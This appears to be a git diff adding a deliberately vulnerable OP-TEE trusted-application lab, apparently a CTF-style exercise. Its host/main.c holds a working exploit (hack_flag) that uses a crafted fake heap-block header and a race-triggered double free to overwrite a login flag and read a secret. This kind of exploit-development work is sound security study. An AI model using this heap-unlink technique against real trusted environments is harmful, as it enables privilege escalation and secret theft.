@@ -1,0 +1,3070 @@
+diff --git a/heap_vuln/Android.mk b/heap_vuln/Android.mk
+new file mode 100644
+index 0000000..198827c
+--- /dev/null
++++ b/heap_vuln/Android.mk
+@@ -0,0 +1,21 @@
++###################### optee-vuln ######################
++LOCAL_PATH := $(call my-dir)
++
++# OPTEE_CLIENT_EXPORT = $(LOCAL_PATH)/../../optee_client/out/export
++
++include $(CLEAR_VARS)
++LOCAL_CFLAGS += -DANDROID_BUILD
++LOCAL_CFLAGS += -Wall
++
++LOCAL_SRC_FILES += host/main.c
++
++LOCAL_C_INCLUDES := $(LOCAL_PATH)/ta/include \
++		# $(OPTEE_CLIENT_EXPORT)/include
++
++LOCAL_SHARED_LIBRARIES := libteec
++LOCAL_MODULE := optee_example_heap_vuln
++LOCAL_VENDOR_MODULE := true
++LOCAL_MODULE_TAGS := optional
++include $(BUILD_EXECUTABLE)
++
++include $(LOCAL_PATH)/ta/Android.mk
+diff --git a/heap_vuln/CMakeLists.txt b/heap_vuln/CMakeLists.txt
+new file mode 100644
+index 0000000..31ba7c4
+--- /dev/null
++++ b/heap_vuln/CMakeLists.txt
+@@ -0,0 +1,13 @@
++project (optee_example_heap_vuln C)
++
++set (SRC host/main.c)
++
++add_executable (${PROJECT_NAME} ${SRC})
++
++target_include_directories(${PROJECT_NAME}
++			   PRIVATE ta/include
++			   PRIVATE include)
++
++target_link_libraries (${PROJECT_NAME} PRIVATE teec)
++
++install (TARGETS ${PROJECT_NAME} DESTINATION ${CMAKE_INSTALL_BINDIR})
+diff --git a/heap_vuln/Makefile b/heap_vuln/Makefile
+new file mode 100644
+index 0000000..b188683
+--- /dev/null
++++ b/heap_vuln/Makefile
+@@ -0,0 +1,15 @@
++export V?=0
++
++# If _HOST or _TA specific compilers are not specified, then use CROSS_COMPILE
++HOST_CROSS_COMPILE ?= $(CROSS_COMPILE)
++TA_CROSS_COMPILE ?= $(CROSS_COMPILE)
++
++.PHONY: all
++all:
++	$(MAKE) -C host CROSS_COMPILE="$(HOST_CROSS_COMPILE)" --no-builtin-variables
++	$(MAKE) -C ta CROSS_COMPILE="$(TA_CROSS_COMPILE)" LDFLAGS=""
++
++.PHONY: clean
++clean:
++	$(MAKE) -C host clean
++	$(MAKE) -C ta clean
+diff --git a/heap_vuln/host/Makefile b/heap_vuln/host/Makefile
+new file mode 100644
+index 0000000..03c134f
+--- /dev/null
++++ b/heap_vuln/host/Makefile
+@@ -0,0 +1,28 @@
++CC      ?= $(CROSS_COMPILE)gcc
++LD      ?= $(CROSS_COMPILE)ld
++AR      ?= $(CROSS_COMPILE)ar
++NM      ?= $(CROSS_COMPILE)nm
++OBJCOPY ?= $(CROSS_COMPILE)objcopy
++OBJDUMP ?= $(CROSS_COMPILE)objdump
++READELF ?= $(CROSS_COMPILE)readelf
++
++OBJS = main.o
++
++CFLAGS += -Wall -I../ta/include -I$(TEEC_EXPORT)/include -I./include
++#Add/link other required libraries here
++LDADD += -lteec -L$(TEEC_EXPORT)/lib
++
++BINARY = optee_example_heap_vuln
++
++.PHONY: all
++all: $(BINARY)
++
++$(BINARY): $(OBJS)
++	$(CC) -o $@ $< $(LDADD)
++
++.PHONY: clean
++clean:
++	rm -f $(OBJS) $(BINARY)
++
++%.o: %.c
++	$(CC) $(CFLAGS) -c $< -o $@
+diff --git a/heap_vuln/host/main.c b/heap_vuln/host/main.c
+new file mode 100644
+index 0000000..be3ecf2
+--- /dev/null
++++ b/heap_vuln/host/main.c
+@@ -0,0 +1,596 @@
++#include <err.h>
++#include <stdio.h>
++#include <stdlib.h>
++#include <string.h>
++#include <sysexits.h>
++#include <errno.h>
++
++/* OP-TEE TEE client API (built by optee_client) */
++#include <tee_client_api.h>
++
++/* To the the UUID (found the the TA's h-file(s)) */
++#include <heap_ta.h>
++
++#include "tee_api_defines.h"
++
++#include <stdio.h>
++#include <execinfo.h>
++#include <signal.h>
++#include <stdlib.h>
++#include <unistd.h>
++#include <pthread.h>
++
++#define PTA_HEAP_VULN_UUID                                 \
++    {                                                      \
++        0x861b6bfd, 0xe631, 0xf2ba,                        \
++        {                                                  \
++            0x7e, 0x66, 0x15, 0xcd, 0xbe, 0xf4, 0x4c, 0x7b \
++        }                                                  \
++    }
++
++typedef union uint64_bytes
++{
++    uint64_t val;
++    uint8_t bytes[8];
++} uint64_bytes;
++
++//const TEEC_UUID TA_UUID = TA_HEAP_UUID;
++const TEEC_UUID TA_UUID = PTA_HEAP_VULN_UUID;
++
++// ================================================================
++// HELPERS FOR INTEGERS
++// ================================================================
++static inline uint64_t reg_pair_to_64(uint32_t reg0, uint32_t reg1)
++{
++    return (uint64_t)reg0 << 32 | reg1;
++}
++
++static inline void reg_pair_from_64(uint64_t val, uint32_t *reg0,
++                                    uint32_t *reg1)
++{
++    *reg0 = val >> 32;
++    *reg1 = val;
++}
++
++// ================================================================
++// HELPERS FOR ERROR HANDLING
++// ================================================================
++
++void handler(int sig)
++{
++    void *array[64];
++    size_t size;
++
++    // get void*'s for all entries on the stack
++    size = backtrace(array, 10);
++
++    // print out all the frames to stderr
++    fprintf(stderr, "==== ERROR ====\nsignal %d:\n", sig);
++    backtrace_symbols_fd(array, size, STDERR_FILENO);
++    fprintf(stderr, "\n");
++    fprintf(stdout, "\n");
++    exit(1);
++}
++
++static void report_return(char const *fct, uint32_t return_code, uint32_t origin)
++{
++    char *origin_text = "";
++    char *return_code_text = "";
++    switch (origin)
++    {
++    // 1--4
++    case TEEC_ORIGIN_API:
++        origin_text = "TEEC_ORIGIN_API";
++        break;
++    case TEEC_ORIGIN_COMMS:
++        origin_text = "TEEC_ORIGIN_COMMS";
++        break;
++    case TEEC_ORIGIN_TEE:
++        origin_text = "TEEC_ORIGIN_TEE";
++        break;
++    case TEEC_ORIGIN_TRUSTED_APP:
++        origin_text = "TEEC_ORIGIN_TRUSTED_APP";
++        break;
++    // >4
++    default:
++        origin_text = "reserved for future use";
++        break;
++    }
++    switch (return_code)
++    {
++    // TEE_SUCCESS, TEEC_SUCCESS @ 0x00000000
++    case 0x00000000:
++        return_code_text = "SUCCESS";
++        break;
++    // Client API defined Errors TEEC_* @ 0xFFFF00..
++    case TEEC_ERROR_GENERIC:
++        return_code_text = "TEEC_ERROR_GENERIC";
++        break;
++    case TEEC_ERROR_ACCESS_DENIED:
++        return_code_text = "TEEC_ERROR_ACCESS_DENIED";
++        break;
++    case TEEC_ERROR_CANCEL:
++        return_code_text = "TEEC_ERROR_CANCEL";
++        break;
++    case TEEC_ERROR_ACCESS_CONFLICT:
++        return_code_text = "TEEC_ERROR_ACCESS_CONFLICT";
++        break;
++    case TEEC_ERROR_EXCESS_DATA:
++        return_code_text = "TEEC_ERROR_EXCESS_DATA";
++        break;
++    case TEEC_ERROR_BAD_FORMAT:
++        return_code_text = "TEEC_ERROR_BAD_FORMAT";
++        break;
++    case TEEC_ERROR_BAD_PARAMETERS:
++        return_code_text = "TEEC_ERROR_BAD_PARAMETERS";
++        break;
++    case TEEC_ERROR_BAD_STATE:
++        return_code_text = "TEEC_ERROR_BAD_STATE";
++        break;
++    case TEEC_ERROR_ITEM_NOT_FOUND:
++        return_code_text = "TEEC_ERROR_ITEM_NOT_FOUND";
++        break;
++    case TEEC_ERROR_NOT_IMPLEMENTED:
++        return_code_text = "TEEC_ERROR_NOT_IMPLEMENTED";
++        break;
++    case TEEC_ERROR_NOT_SUPPORTED:
++        return_code_text = "TEEC_ERROR_NOT_SUPPORTED";
++        break;
++    case TEEC_ERROR_NO_DATA:
++        return_code_text = "TEEC_ERROR_NO_DATA";
++        break;
++    case TEEC_ERROR_OUT_OF_MEMORY:
++        return_code_text = "TEEC_ERROR_OUT_OF_MEMORY";
++        break;
++    case TEEC_ERROR_BUSY:
++        return_code_text = "TEEC_ERROR_BUSY";
++        break;
++    case TEEC_ERROR_COMMUNICATION:
++        return_code_text = "TEEC_ERROR_COMMUNICATION";
++        break;
++    case TEEC_ERROR_SECURITY:
++        return_code_text = "TEEC_ERROR_SECURITY";
++        break;
++    case TEEC_ERROR_SHORT_BUFFER:
++        return_code_text = "TEEC_ERROR_SHORT_BUFFER";
++        break;
++    // *NON* Client API defined Errors TEEC_* @ 0xFFFF00..
++    case TEE_ERROR_EXTERNAL_CANCEL:
++        return_code_text = "TEE_ERROR_EXTERNAL_CANCEL";
++        break;
++    // *NON* Client API defined Errors TEEC_* @ 0xFFFF30..
++    case TEE_ERROR_OVERFLOW:
++        return_code_text = "TEE_ERROR_OVERFLOW";
++        break;
++    case TEE_ERROR_TARGET_DEAD:
++        return_code_text = "TEE_ERROR_TARGET_DEAD";
++        break;
++    case TEE_ERROR_STORAGE_NO_SPACE:
++        return_code_text = "TEE_ERROR_STORAGE_NO_SPACE";
++        break;
++    case TEE_ERROR_MAC_INVALID:
++        return_code_text = "TEE_ERROR_MAC_INVALID";
++        break;
++    case TEE_ERROR_SIGNATURE_INVALID:
++        return_code_text = "TEE_ERROR_SIGNATURE_INVALID";
++        break;
++    // *NON* Client API defined Errors TEEC_* @ 0xFFFF50..
++    case TEE_ERROR_TIME_NOT_SET:
++        return_code_text = "TEE_ERROR_TIME_NOT_SET";
++        break;
++    case TEE_ERROR_TIME_NEEDS_RESET:
++        return_code_text = "TEE_ERROR_TIME_NEEDS_RESET";
++        break;
++
++    // TEE @
++    default:
++        return_code_text =
++            origin == TEEC_ORIGIN_TRUSTED_APP
++                ? "TA-defined"
++            : return_code < 0x70000000
++                ? "reserved for GlobalPlatform non-error"
++            : return_code < 0x80000000
++                ? "reserved for implementation-defined non-error"
++            : return_code < 0xF0000000
++                ? "reserved for GlobalPlatform future use"
++            : return_code < 0xFFFF0000
++                ? "reserved for GlobalPlatform TEE API"
++                : "reserved for GlobalPlatform TEE Client API";
++        break;
++    }
++    printf("%s end with origin and return code:\n", fct);
++    printf("%#8X (%s): %#8X (%s)\n", origin, origin_text, return_code, return_code_text);
++}
++
++static void check_return(char const *fct, uint32_t res, uint32_t err_origin)
++{
++    if (res != TEEC_SUCCESS)
++    {
++        report_return(fct, res, err_origin);
++        errx(1, "Fatal error.\n");
++    }
++}
++
++TEEC_Result thread_ca(void *arg) {
++    static TEEC_Result res;
++    TEEC_Context ctx;
++    TEEC_Session sess;
++    uint32_t err_origin;
++
++    TEEC_Value value = *(TEEC_Value*)arg;
++
++    /* Initialize a context connecting us to the TEE */
++    res = TEEC_InitializeContext(NULL, &ctx);
++    if (res != TEEC_SUCCESS)
++        errx(1, "TEEC_InitializeContext failed with code 0x%x", res);
++
++    res = TEEC_OpenSession(&ctx, &sess, &TA_UUID, TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
++    check_return("TEEC_Opensession", res, err_origin);
++
++    TEEC_Operation op;
++
++    // TA_HEAP_CMD_USER_EXIT
++    memset(&op, 0, sizeof(op));
++    op.paramTypes = TEEC_PARAM_TYPES (
++        TEEC_VALUE_INPUT,
++        TEEC_NONE,
++        TEEC_NONE,
++        TEEC_NONE
++    );
++    op.params[0].value = value;
++    printf("TA_HEAP_CMD_USER_EXIT User 1:\n");
++    res = TEEC_InvokeCommand(&sess, TA_HEAP_CMD_USER_EXIT, &op, &err_origin);
++    report_return("TEEC_InvokeCommand", res, err_origin);
++
++    TEEC_CloseSession(&sess);
++    TEEC_FinalizeContext(&ctx);
++
++    pthread_exit((void *)(&res));
++}
++
++typedef struct user_exit_arg {
++    TEEC_Session sess;
++    TEEC_Value value;
++} user_exit_arg;
++
++
++TEEC_Result thread_user_exit(user_exit_arg arg) {
++    static TEEC_Result res;
++    TEEC_Operation op;
++    uint32_t err_origin;
++
++    TEEC_Session sess = arg.sess;
++    TEEC_Value value_user_id = arg.value;
++
++    memset(&op, 0, sizeof(op));
++    op.paramTypes = TEEC_PARAM_TYPES (
++        TEEC_VALUE_INPUT,
++        TEEC_NONE,
++        TEEC_NONE,
++        TEEC_NONE
++    );
++    op.params[0].value = value_user_id;
++    printf("TA_HEAP_CMD_USER_EXIT User 1:\n");
++    res = TEEC_InvokeCommand(&sess, TA_HEAP_CMD_USER_EXIT, &op, &err_origin);
++    report_return("TEEC_InvokeCommand", res, err_origin);
++
++    pthread_exit((void *)(&res));
++}
++
++// ================================================================
++
++static void invoke()
++{
++    TEEC_Result res;
++    TEEC_Context ctx;
++    TEEC_Session sess;
++    uint32_t err_origin;
++
++    /* Initialize a context connecting us to the TEE */
++    res = TEEC_InitializeContext(NULL, &ctx);
++    if (res != TEEC_SUCCESS)
++        errx(1, "TEEC_InitializeContext failed with code 0x%x", res);
++
++    res = TEEC_OpenSession(&ctx, &sess, &TA_UUID, TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
++    check_return("TEEC_Opensession", res, err_origin);
++
++    for (int repeat = 0; repeat < 3; repeat++)
++    {
++        TEEC_Value handles[4];
++        for (int i = 0; i < 4; i++)
++        {
++            // TA_HEAP_CMD_USER_ENTER
++            TEEC_Operation op;
++            memset(&op, 0, sizeof(op));
++            const char *username = "Someuser";
++            op.paramTypes = TEEC_PARAM_TYPES(
++                TEEC_MEMREF_TEMP_INPUT,
++                TEEC_VALUE_OUTPUT,
++                TEEC_VALUE_OUTPUT,
++                TEEC_NONE);
++            op.params[0].tmpref.buffer = username;
++            op.params[0].tmpref.size = strlen(username);
++            printf("TA_HEAP_CMD_USER_ENTER:\n");
++            res = TEEC_InvokeCommand(&sess, TA_HEAP_CMD_USER_ENTER, &op, &err_origin);
++            report_return("TEEC_InvokeCommand", res, err_origin);
++            TEEC_Value handle = op.params[1].value; // avoid reg-pair handling.
++            handles[i] = handle;
++            if (res != TEE_SUCCESS)
++                goto fin;
++
++            // TA_HEAP_CMD_GET_USER_ADDR
++            memset(&op, 0, sizeof(op));
++            op.paramTypes = TEEC_PARAM_TYPES(
++                TEEC_VALUE_INPUT,
++                TEEC_VALUE_OUTPUT,
++                TEEC_NONE,
++                TEEC_NONE);
++            op.params[0].value = handle;
++            printf("TA_HEAP_CMD_GET_USER_ADDR:\n");
++            res = TEEC_InvokeCommand(&sess, TA_HEAP_CMD_GET_USER_ADDR, &op, &err_origin);
++            report_return("TEEC_InvokeCommand", res, err_origin);
++            if (res != TEE_SUCCESS)
++                goto fin;
++            printf("Got user address: [%#x]\n", reg_pair_to_64(op.params[1].value.a, op.params[1].value.b));
++
++            // TA_HEAP_CMD_LOGIN
++            memset(&op, 0, sizeof(op));
++            const char *password = "p4ssw0rd";
++            op.paramTypes = TEEC_PARAM_TYPES(
++                TEEC_VALUE_INPUT,
++                TEEC_MEMREF_TEMP_INPUT,
++                TEEC_NONE,
++                TEEC_NONE);
++            op.params[0].value = handle;
++            op.params[1].tmpref = (TEEC_TempMemoryReference){.buffer = password, .size = strlen(password)};
++            printf("TA_HEAP_CMD_LOGIN:\n");
++            res = TEEC_InvokeCommand(&sess, TA_HEAP_CMD_LOGIN, &op, &err_origin);
++            report_return("TEEC_InvokeCommand", res, err_origin);
++            if (res != TEE_SUCCESS)
++                goto fin;
++
++            // TA_HEAP_CMD_TELL_ME
++            memset(&op, 0, sizeof(op));
++            const char outbuffer[256] = {};
++            op.paramTypes = TEEC_PARAM_TYPES(
++                TEEC_VALUE_INPUT,
++                TEEC_MEMREF_TEMP_OUTPUT,
++                TEEC_NONE,
++                TEEC_NONE);
++            op.params[0].value = handle;
++            op.params[1].tmpref = (TEEC_TempMemoryReference){.buffer = outbuffer, .size = sizeof(outbuffer)};
++            printf("TA_HEAP_CMD_TELL_ME:\n");
++            res = TEEC_InvokeCommand(&sess, TA_HEAP_CMD_TELL_ME, &op, &err_origin);
++            report_return("TEEC_InvokeCommand", res, err_origin);
++            if (res != TEE_SUCCESS)
++                goto fin;
++
++            printf("Secret: %s\n", outbuffer);
++            // printf("Strlen: %zu\n", strlen(op.params[0].tmpref.buffer));
++            // printf("Size: %zu\n", op.params[0].tmpref.size);
++            // printf("Pointer: %p\n", op.params[0].tmpref.buffer);
++            // printf("Contents: %s\n", (char*)op.params[0].tmpref.buffer);
++        }
++        for (int i = 0; i < 4; i++)
++        {
++            TEEC_Operation op;
++            // TA_HEAP_CMD_USER_EXIT
++            memset(&op, 0, sizeof(op));
++            op.paramTypes = TEEC_PARAM_TYPES(
++                TEEC_VALUE_INPUT,
++                TEEC_NONE,
++                TEEC_NONE,
++                TEEC_NONE);
++            op.params[0].value = handles[i];
++            printf("TA_HEAP_CMD_USER_EXIT:\n");
++            res = TEEC_InvokeCommand(&sess, TA_HEAP_CMD_USER_EXIT, &op, &err_origin);
++            report_return("TEEC_InvokeCommand", res, err_origin);
++            if (res != TEE_SUCCESS)
++                goto fin;
++        }
++    }
++
++fin:
++    TEEC_CloseSession(&sess);
++    TEEC_FinalizeContext(&ctx);
++}
++
++static void hack_flag()
++{
++    TEEC_Result res;
++    TEEC_Context ctx;
++    TEEC_Session sess;
++    uint32_t err_origin;
++
++    /*
++        ==== HEAP LAYOUT ====
++        .... Free memory.
++        0x10 struct bhead
++        0x20 char[] password2
++        0x10 struct bhead
++        0x30 struct User2 (target: isLoggedIn at +0x10, usernameLen at +0x18, passwordLen at +0x20) @ 0x40028380.
++            Ideas:
++                Shorten "Admin123" Username to "Admin"
++                Set Logged-In-Flag
++                Shorten Password to one char size
++        0x10 struct bhead
++        0x30 char[] username2
++        0x10 struct bhead
++        0x20 char[] password1
++        0x10 struct bhead
++        0x30 struct User1 @ 0x40028430.
++        0x10 struct bhead
++        ???? char[] username1 (double freed)
++            pf gets written, which is located at username1+sizeof(username1)
++            it's referenced by bhead_username1 + (sizeof(bhead)+sizeof(username1))
++            which is now modified to bhead_username1 - (sizeof(bhead)+sizeof(username1))
++            we want this to reference User2 + User2_offset
++            we have:
++                User2_offset := 0x10
++                bhead_username1 - (sizeof(bhead)+sizeof(username1))
++                bhead_username1 = username1 - sizeof(bhead)
++                diff := username1 - username2
++                    = sizeof(bhead) + sizeof(User1) + sizeof(bhead) + sizeof(password1) + sizeof(bhead) + sizeof(username2)
++                    = 0x10          + 0x30          + 0x10          + 0x20              + 0x10          + 0x30
++                    = 0xB0
++            we want:
++                bhead_username1           - (sizeof(bhead)+sizeof(username1)) == username2
++                bhead_username1           - sizeof(bhead) - sizeof(username1) == username2
++                username1 - sizeof(bhead) - sizeof(bhead) - sizeof(username1) == username2
++                | -= diff
++                username2 - sizeof(bhead) - sizeof(bhead) - sizeof(username1) == username2 - diff
++                          - sizeof(bhead) - sizeof(bhead) - sizeof(username1) ==           - diff
++                                                          - sizeof(username1) ==           - diff + 2*sizeof(bhead)
++                                                            sizeof(username1) ==             diff - 2*sizeof(bhead)
++                                                            sizeof(username1) ==             0xB0 - 2*0x10
++                                                            sizeof(username1) == 0x90
++            which means, we cannot reach offsets undivisable by 0x10, since username1 can only be resized in increments of 0x10. (BGET's SIZE_QUANT)
++        0x10 struct bhead
++        .... some libutee/libutils overhead
++        0x10 struct bhead end sentinel
++    */
++
++    /* Initialize a context connecting us to the TEE */
++    res = TEEC_InitializeContext(NULL, &ctx);
++    if (res != TEEC_SUCCESS)
++        errx(1, "TEEC_InitializeContext failed with code 0x%x", res);
++
++    res = TEEC_OpenSession(&ctx, &sess, &TA_UUID, TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
++    check_return("TEEC_Opensession", res, err_origin);
++
++    TEEC_Operation op;
++
++    // TA_HEAP_CMD_USER_ENTER #1
++    memset(&op, 0, sizeof(op));
++    const char username1[0x90];
++    op.paramTypes = TEEC_PARAM_TYPES(
++        TEEC_MEMREF_TEMP_INPUT,
++        TEEC_VALUE_OUTPUT,
++        TEEC_VALUE_OUTPUT,
++        TEEC_NONE);
++    op.params[0].tmpref.buffer = username1;
++    op.params[0].tmpref.size = sizeof(username1);
++    printf("TA_HEAP_CMD_USER_ENTER User 1:\n");
++    res = TEEC_InvokeCommand(&sess, TA_HEAP_CMD_USER_ENTER, &op, &err_origin);
++    report_return("TEEC_InvokeCommand", res, err_origin);
++    TEEC_Value value_user1_id = op.params[1].value; // avoid reg-pair handling.
++    if (res != TEE_SUCCESS)
++        goto fin;
++
++    uint64_t user1_addr = reg_pair_to_64(op.params[2].value.a, op.params[2].value.b);
++    //uint64_t user2_addr = user1_addr - 0xC0;   // user mode
++    uint64_t user2_addr = user1_addr - 0x220; // kernel mode
++    uint64_t flink = user2_addr - 0x08;
++    uint64_t blink = user1_addr + 0x01;
++    uint64_bytes fb = {.val = flink};
++    uint64_bytes bb = {.val = blink};
++    printf("Got user1 id: [%d], addr: [%#x], calc user2 addr: [%#x]\n",
++            reg_pair_to_64(op.params[1].value.a, op.params[1].value.b),
++            user1_addr, user2_addr);
++    printf("fb: 0x%02x, 0x%02x, 0x%02x, 0x%02x\n", fb.bytes[0], fb.bytes[1], fb.bytes[2], fb.bytes[3]);
++    printf("bb: 0x%02x, 0x%02x, 0x%02x, 0x%02x\n", bb.bytes[0], bb.bytes[1], bb.bytes[2], bb.bytes[3]);
++
++    // TA_HEAP_CMD_USER_ENTER #2
++    memset(&op, 0, sizeof(op));
++    const char username2[0x30] = {
++        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // prevfree, is ignored
++        0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // size, is summed up
++        fb.bytes[0], fb.bytes[1], fb.bytes[2], fb.bytes[3], // flink, where to write: user2_addr+0x10-0x18 (+0x18 is the offset of blink in bfhead)
++        fb.bytes[4], fb.bytes[5], fb.bytes[6], fb.bytes[7],
++        bb.bytes[0], bb.bytes[1], bb.bytes[2], bb.bytes[3], // blink, what to write: user1_addr+0x01 (least significant byte is of interest and should not be 0)
++        bb.bytes[4], bb.bytes[5], bb.bytes[6], bb.bytes[7]};
++    op.paramTypes = TEEC_PARAM_TYPES(
++        TEEC_MEMREF_TEMP_INPUT,
++        TEEC_VALUE_OUTPUT,
++        TEEC_VALUE_OUTPUT,
++        TEEC_NONE);
++    op.params[0].tmpref.buffer = username2;
++    op.params[0].tmpref.size = sizeof(username2);
++    printf("TA_HEAP_CMD_USER_ENTER User 2:\n");
++    res = TEEC_InvokeCommand(&sess, TA_HEAP_CMD_USER_ENTER, &op, &err_origin);
++    report_return("TEEC_InvokeCommand", res, err_origin);
++    TEEC_Value value_user2_id = op.params[1].value; // avoid reg-pair handling.
++    if (res != TEE_SUCCESS)
++        goto fin;
++    printf("Got user2 id: [%d], addr: [%#x]\n",
++            reg_pair_to_64(op.params[1].value.a, op.params[1].value.b),
++            reg_pair_to_64(op.params[2].value.a, op.params[2].value.b));
++
++    // TA_HEAP_CMD_USER_EXIT #1 twice
++    pthread_t threads[2] = {};
++    TEEC_Result* ress[2] = {};
++
++    // user_exit_arg arg = {.sess = sess, .value = value_user1_id};
++    // pthread_create(&threads[0], 0, thread_user_exit, &arg);
++    // pthread_create(&threads[1], 0, thread_user_exit, &arg);
++
++    pthread_create(&threads[0], 0, thread_ca, &value_user1_id);
++    pthread_create(&threads[1], 0, thread_ca, &value_user1_id);
++
++    pthread_join(threads[0], (void**)&ress[0]);
++    pthread_join(threads[1], (void**)&ress[1]);
++
++    if(*(ress[0]) != TEE_SUCCESS || *(ress[1]) != TEE_SUCCESS) goto fin;
++
++    // TA_HEAP_CMD_TELL_ME #2
++    memset(&op, 0, sizeof(op));
++    const char outbuffer[256] = {};
++    op.paramTypes = TEEC_PARAM_TYPES(
++        TEEC_VALUE_INPUT,
++        TEEC_MEMREF_TEMP_OUTPUT,
++        TEEC_NONE,
++        TEEC_NONE);
++    op.params[0].value = value_user2_id;
++    op.params[1].tmpref = (TEEC_TempMemoryReference){.buffer = outbuffer, .size = sizeof(outbuffer)};
++    printf("TA_HEAP_CMD_TELL_ME User 2:\n");
++    res = TEEC_InvokeCommand(&sess, TA_HEAP_CMD_TELL_ME, &op, &err_origin);
++    report_return("TEEC_InvokeCommand", res, err_origin);
++    if (res == TEE_SUCCESS) {
++        printf("Secret: %s\n", outbuffer);
++    }
++
++    // TA_HEAP_CMD_USER_EXIT #2
++    memset(&op, 0, sizeof(op));
++    op.paramTypes = TEEC_PARAM_TYPES(
++        TEEC_VALUE_INPUT,
++        TEEC_NONE,
++        TEEC_NONE,
++        TEEC_NONE);
++    op.params[0].value = value_user2_id;
++    printf("TA_HEAP_CMD_USER_EXIT User 2:\n");
++    res = TEEC_InvokeCommand(&sess, TA_HEAP_CMD_USER_EXIT, &op, &err_origin);
++    report_return("TEEC_InvokeCommand", res, err_origin);
++
++fin:
++    TEEC_CloseSession(&sess);
++    TEEC_FinalizeContext(&ctx);
++}
++
++static void usage(const char *notice)
++{
++    if (notice)
++        printf("%s\n", notice);
++    errx(EX_USAGE, "Usage:\nheap\n");
++}
++
++int main(void)
++{
++    // ==== INFO ====
++
++    signal(SIGSEGV, handler); // install our handler
++    printf("compiletime "__DATE__
++           " "__TIME__
++           "\n");
++    printf("%s %d\n", __FILE__, __LINE__);
++
++    // ==== INVOKE ====
++    // printf("================================================================\n");
++    // printf("invoke(): %s %d\n", __FILE__, __LINE__);
++    // invoke();
++
++    printf("================================================================\n");
++    printf("hack_flag(): %s %d\n", __FILE__, __LINE__);
++    hack_flag();
++
++    return 0;
++}
+diff --git a/heap_vuln/host/tee_api_defines.h b/heap_vuln/host/tee_api_defines.h
+new file mode 100644
+index 0000000..c71108a
+--- /dev/null
++++ b/heap_vuln/host/tee_api_defines.h
+@@ -0,0 +1,453 @@
++/* SPDX-License-Identifier: BSD-2-Clause */
++/*
++ * Copyright (c) 2014, STMicroelectronics International N.V.
++ */
++
++/* Based on GP TEE Internal Core API Specification Version 1.1 */
++
++#ifndef TEE_API_DEFINES_H
++#define TEE_API_DEFINES_H
++
++#define TEE_INT_CORE_API_SPEC_VERSION     0x0000000A
++
++#define TEE_HANDLE_NULL                   0
++
++#define TEE_TIMEOUT_INFINITE              0xFFFFFFFF
++
++/* API Error Codes */
++#define TEE_SUCCESS                       0x00000000
++#define TEE_ERROR_CORRUPT_OBJECT          0xF0100001
++#define TEE_ERROR_CORRUPT_OBJECT_2        0xF0100002
++#define TEE_ERROR_STORAGE_NOT_AVAILABLE   0xF0100003
++#define TEE_ERROR_STORAGE_NOT_AVAILABLE_2 0xF0100004
++#define TEE_ERROR_GENERIC                 0xFFFF0000
++#define TEE_ERROR_ACCESS_DENIED           0xFFFF0001
++#define TEE_ERROR_CANCEL                  0xFFFF0002
++#define TEE_ERROR_ACCESS_CONFLICT         0xFFFF0003
++#define TEE_ERROR_EXCESS_DATA             0xFFFF0004
++#define TEE_ERROR_BAD_FORMAT              0xFFFF0005
++#define TEE_ERROR_BAD_PARAMETERS          0xFFFF0006
++#define TEE_ERROR_BAD_STATE               0xFFFF0007
++#define TEE_ERROR_ITEM_NOT_FOUND          0xFFFF0008
++#define TEE_ERROR_NOT_IMPLEMENTED         0xFFFF0009
++#define TEE_ERROR_NOT_SUPPORTED           0xFFFF000A
++#define TEE_ERROR_NO_DATA                 0xFFFF000B
++#define TEE_ERROR_OUT_OF_MEMORY           0xFFFF000C
++#define TEE_ERROR_BUSY                    0xFFFF000D
++#define TEE_ERROR_COMMUNICATION           0xFFFF000E
++#define TEE_ERROR_SECURITY                0xFFFF000F
++#define TEE_ERROR_SHORT_BUFFER            0xFFFF0010
++#define TEE_ERROR_EXTERNAL_CANCEL         0xFFFF0011
++#define TEE_ERROR_OVERFLOW                0xFFFF300F
++#define TEE_ERROR_TARGET_DEAD             0xFFFF3024
++#define TEE_ERROR_STORAGE_NO_SPACE        0xFFFF3041
++#define TEE_ERROR_MAC_INVALID             0xFFFF3071
++#define TEE_ERROR_SIGNATURE_INVALID       0xFFFF3072
++#define TEE_ERROR_TIME_NOT_SET            0xFFFF5000
++#define TEE_ERROR_TIME_NEEDS_RESET        0xFFFF5001
++
++/* Parameter Type Constants */
++#define TEE_PARAM_TYPE_NONE             0
++#define TEE_PARAM_TYPE_VALUE_INPUT      1
++#define TEE_PARAM_TYPE_VALUE_OUTPUT     2
++#define TEE_PARAM_TYPE_VALUE_INOUT      3
++#define TEE_PARAM_TYPE_MEMREF_INPUT     5
++#define TEE_PARAM_TYPE_MEMREF_OUTPUT    6
++#define TEE_PARAM_TYPE_MEMREF_INOUT     7
++
++/* Login Type Constants */
++#define TEE_LOGIN_PUBLIC                0x00000000
++#define TEE_LOGIN_USER                  0x00000001
++#define TEE_LOGIN_GROUP                 0x00000002
++#define TEE_LOGIN_APPLICATION           0x00000004
++#define TEE_LOGIN_APPLICATION_USER      0x00000005
++#define TEE_LOGIN_APPLICATION_GROUP     0x00000006
++#define TEE_LOGIN_TRUSTED_APP           0xF0000000
++
++/* Origin Code Constants */
++#define TEE_ORIGIN_API                  0x00000001
++#define TEE_ORIGIN_COMMS                0x00000002
++#define TEE_ORIGIN_TEE                  0x00000003
++#define TEE_ORIGIN_TRUSTED_APP          0x00000004
++
++/* Property Sets pseudo handles */
++#define TEE_PROPSET_TEE_IMPLEMENTATION  (TEE_PropSetHandle)0xFFFFFFFD
++#define TEE_PROPSET_CURRENT_CLIENT      (TEE_PropSetHandle)0xFFFFFFFE
++#define TEE_PROPSET_CURRENT_TA          (TEE_PropSetHandle)0xFFFFFFFF
++
++/* Memory Access Rights Constants */
++#define TEE_MEMORY_ACCESS_READ             0x00000001
++#define TEE_MEMORY_ACCESS_WRITE            0x00000002
++#define TEE_MEMORY_ACCESS_ANY_OWNER        0x00000004
++
++/* Memory Management Constant */
++#define TEE_MALLOC_FILL_ZERO               0x00000000
++
++/* Other constants */
++#define TEE_STORAGE_PRIVATE                0x00000001
++
++#define TEE_DATA_FLAG_ACCESS_READ          0x00000001
++#define TEE_DATA_FLAG_ACCESS_WRITE         0x00000002
++#define TEE_DATA_FLAG_ACCESS_WRITE_META    0x00000004
++#define TEE_DATA_FLAG_SHARE_READ           0x00000010
